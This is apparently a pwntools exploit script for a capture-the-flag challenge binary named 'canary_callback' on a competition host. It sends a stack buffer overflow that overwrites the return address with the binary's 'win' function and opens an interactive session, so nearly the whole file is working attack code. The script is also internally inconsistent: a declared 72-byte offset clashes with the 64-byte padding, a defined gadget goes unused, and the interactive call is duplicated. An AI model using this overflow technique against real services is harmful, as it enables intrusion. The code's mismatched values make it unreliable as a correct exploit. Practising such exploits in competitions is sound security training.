#!/usr/bin/env python3
from pwn import *

exe = ELF('canary_callback', checksec=False)
context.os = 'linux'
context.binary = exe
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13578

OFFSET_TO_RIP = 72
GADGET = 0x000000000040101a

def conn():
    if args.LOCAL:
        r = process(exe.path)
    else:
        r = remote(HOST, PORT)
    return r

def main():
    r = conn()

    r.recvuntil(b'Whisper your incantation:\n')

    payload = flat(
        b'A' * 64 ,
        p64(exe.sym.win),
    )

    r.send(payload)
    r.interactive()


    r.interactive()


if __name__ == '__main__':
    main()